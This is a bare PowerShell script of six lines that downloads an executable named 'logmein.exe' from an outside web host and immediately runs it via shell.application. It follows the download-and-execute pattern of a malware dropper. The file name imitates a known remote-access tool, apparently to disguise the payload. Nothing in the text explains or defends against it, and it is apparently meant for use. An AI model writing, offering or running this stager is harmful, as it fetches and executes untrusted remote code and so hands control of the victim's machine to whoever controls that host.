$down = New-Object System.Net.WebClient
$url  = 'https://armadyne.systems/logmein.exe';
$file = 'logmein.exe';
$down.DownloadFile($url,$file);
$exec = New-Object -com shell.application
$exec.shellexecute($file);
